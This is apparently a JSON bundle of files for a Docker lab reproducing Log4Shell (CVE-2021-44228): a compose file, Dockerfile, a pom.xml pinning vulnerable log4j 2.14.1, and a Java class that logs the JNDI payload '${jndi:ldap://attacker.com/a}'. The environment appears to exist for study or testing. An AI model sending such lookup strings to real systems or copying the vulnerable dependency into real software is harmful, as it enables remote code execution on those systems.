{
    "file_name": [
        "./../../dockers/CVE-2021-44228/custom/docker-compose.yml",
        "./../../dockers/CVE-2021-44228/custom/Dockerfile",
        "./../../dockers/CVE-2021-44228/custom/src/main/java/com/example/Log4ShellDemo.java",
        "./../../dockers/CVE-2021-44228/custom/pom.xml"
    ],
    "file_code": [
        "services:\n  webapp:\n    build: .\n    ports:\n      - \"8080:8080\"\n    volumes:\n      - ./src:/usr/src/app/src\n    environment:\n      - JAVA_TOOL_OPTIONS=-Dcom.sun.jndi.ldap.object.trustURLCodebase=false\n\n  tomcat:\n    image: tomcat:9.0.53-jdk8-openjdk-slim\n    ports:\n      - \"8888:8080\"\n    volumes:\n      - ./webapps:/usr/local/tomcat/webapps\n",
        "FROM openjdk:8-jdk-alpine\n\nWORKDIR /usr/src/app\n\nCOPY pom.xml ./\nCOPY src ./src\n\nRUN apk add --no-cache maven \\\n    && mvn -f pom.xml clean package -DskipTests\n\nCMD [\"java\", \"-jar\", \"target/Log4ShellDemo.jar\"]\n",
        "package com.example;\n\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\npublic class Log4ShellDemo {\n    private static final Logger logger = LogManager.getLogger(Log4ShellDemo.class);\n\n    public static void main(String[] args) {\n        String userInput = \"${jndi:ldap://attacker.com/a}\";\n        logger.error(\"User input: \" + userInput);\n    }\n}\n",
        "<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>com.example</groupId>\n    <artifactId>Log4ShellDemo</artifactId>\n    <version>1.0-SNAPSHOT</version>\n\n    <properties>\n        <maven.compiler.source>1.8</maven.compiler.source>\n        <maven.compiler.target>1.8</maven.compiler.target>\n    </properties>\n\n    <dependencies>\n        <dependency>\n            <groupId>org.apache.logging.log4j</groupId>\n            <artifactId>log4j-core</artifactId>\n            <version>2.14.1</version>\n        </dependency>\n        <dependency>\n            <groupId>org.apache.logging.log4j</groupId>\n            <artifactId>log4j-api</artifactId>\n            <version>2.14.1</version>\n        </dependency>\n    </dependencies>\n\n    <build>\n        <plugins>\n            <plugin>\n                <groupId>org.apache.maven.plugins</groupId>\n                <artifactId>maven-compiler-plugin</artifactId>\n                <version>3.8.1</version>\n            </plugin>\n            <plugin>\n                <groupId>org.apache.maven.plugins</groupId>\n                <artifactId>maven-shade-plugin</artifactId>\n                <version>3.2.4</version>\n                <executions>\n                    <execution>\n                        <phase>package</phase>\n                        <goals>\n                            <goal>shade</goal>\n                        </goals>\n                        <configuration>\n                            <transformers>\n                                <transformer implementation=\"org.apache.maven.plugins.shade.resource.ManifestResourceTransformer\">\n                                    <mainClass>com.example.Log4ShellDemo</mainClass>\n                                </transformer>\n                            </transformers>\n                        </configuration>\n                    </execution>\n                </executions>\n            </plugin>\n        </plugins>\n    </build>\n\n</project>\n"
    ],
    "directory_tree": "CVE-2021-44228/\n\u2514\u2500\u2500 custom\n    \u251c\u2500\u2500 docker-compose.yml\n    \u251c\u2500\u2500 Dockerfile\n    \u251c\u2500\u2500 pom.xml\n    \u2514\u2500\u2500 src\n        \u2514\u2500\u2500 main\n            \u2514\u2500\u2500 java\n                \u2514\u2500\u2500 com\n                    \u2514\u2500\u2500 example\n                        \u2514\u2500\u2500 Log4ShellDemo.java\n"
}